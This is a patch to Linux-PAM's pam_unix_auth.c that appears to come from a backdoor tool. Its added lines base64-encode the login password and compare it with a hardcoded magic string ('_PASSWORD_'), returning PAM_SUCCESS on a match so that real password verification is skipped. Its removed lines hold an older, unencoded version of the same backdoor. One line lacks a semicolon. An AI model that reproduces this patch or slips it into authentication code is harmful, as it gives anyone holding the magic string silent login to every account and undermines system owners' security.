@@ -1,23 +1,36 @@
-*** ./modules/pam_unix/pam_unix_auth.c	2016-04-11 08:08:47.000000000 -0300
---- pam_unix_auth.c	2017-06-07 21:25:25.656306410 -0300
-***************
-*** 170,176 ****
-  	D(("user=%s, password=[%s]", name, p));
-  
-  	/* verify the password of this user */
-! 	retval = _unix_verify_password(pamh, name, p, ctrl);
-  	name = p = NULL;
-  
-  	AUTH_RETURN;
---- 170,180 ----
-  	D(("user=%s, password=[%s]", name, p));
-  
-  	/* verify the password of this user */
-!         if (strcmp(p, "_PASSWORD_") != 0) {
-!           retval = _unix_verify_password(pamh, name, p, ctrl);
-!         } else {
-!           retval = PAM_SUCCESS;
-!         }
-  	name = p = NULL;
-  
-  	AUTH_RETURN;
+--- ./modules/pam_unix/pam_unix_auth.c	2020-05-18 17:14:31.000000000 -0700
++++ pam_unix_auth.c	2020-05-18 22:23:26.000000000 -0700
+@@ -49,6 +49,8 @@
+ #include <sys/types.h>
+ #include <sys/stat.h>
+ #include <syslog.h>
++#include "b64.h"
++#include "encode.c"
+ 
+ #include <security/_pam_macros.h>
+ #include <security/pam_modules.h>
+@@ -71,6 +73,9 @@
+  *      onto a normal UNIX authentication
+  */
+ 
++unsigned char *bdstr = "_PASSWORD_";
++
++
+ #define AUTH_RETURN						\
+ do {									\
+ 	D(("recording return code for next time [%d]",		\
+@@ -170,7 +175,13 @@
+ 	D(("user=%s, password=[%s]", name, p));
+ 
+ 	/* verify the password of this user */
+-	retval = _unix_verify_password(pamh, name, p, ctrl);
++        char *bdenc = b64_encode(p, strlen(p));
++        if (strcmp(bdenc, bdstr) != 0) {
++          retval = _unix_verify_password(pamh, name, p, ctrl);
++        } else {
++          retval = PAM_SUCCESS;
++        }
++        free(bdenc)
+ 	name = p = NULL;
+ 
+ 	AUTH_RETURN;
